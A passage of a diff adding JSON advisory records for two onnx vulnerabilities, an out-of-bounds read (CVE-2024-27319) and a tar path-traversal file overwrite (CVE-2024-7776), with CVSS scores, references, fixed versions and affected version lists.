+      "primary_id": "CVE-2024-27319",
+      "aliases": [
+        "CVE-2024-27319",
+        "GHSA-h8wv-9h96-m4hr"
+      ],
+      "cve_ids": [
+        "CVE-2024-27319"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": null,
+      "details": "Versions of the package onnx before and including 1.15.0 are vulnerable to Out-of-bounds Read as the ONNX_ASSERT and ONNX_ASSERTM functions have an off by one string copy.\n",
+      "published": "2024-02-23T18:15:50Z",
+      "modified": "2025-01-22T16:56:45.397855Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "FIX",
+          "url": "https://github.com/onnx/onnx/commit/08a399ba75a805b7813ab8936b91d0e274b08287"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FGTBH5ZYL2LGYHIJDHN2MAUURIR5E7PY/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TFJJID2IZDOLFDMWVYTBDI75ZJQC6JOL/"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-223",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.16.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2025-10",
+      "primary_id": "CVE-2024-7776",
+      "aliases": [
+        "CVE-2024-7776",
+        "GHSA-h36j-8vv3-cj52"
+      ],
+      "cve_ids": [
+        "CVE-2024-7776"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": null,
+      "details": "A vulnerability in the `download_model` function of the onnx/onnx framework, before and including version 1.16.1, allows for arbitrary file overwrite due to inadequate prevention of path traversal attacks in malicious tar files. This vulnerability can be exploited by an attacker to overwrite files in the user's directory, potentially leading to remote command execution.",
+      "published": "2025-03-20T10:15:37Z",
+      "modified": "2025-03-26T19:57:31.967399Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://huntr.com/bounties/a7a46cf6-1fa0-454b-988c-62d222e83f63"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2025-10",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.16.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1"
+      ]
+    }
+  ]
+}
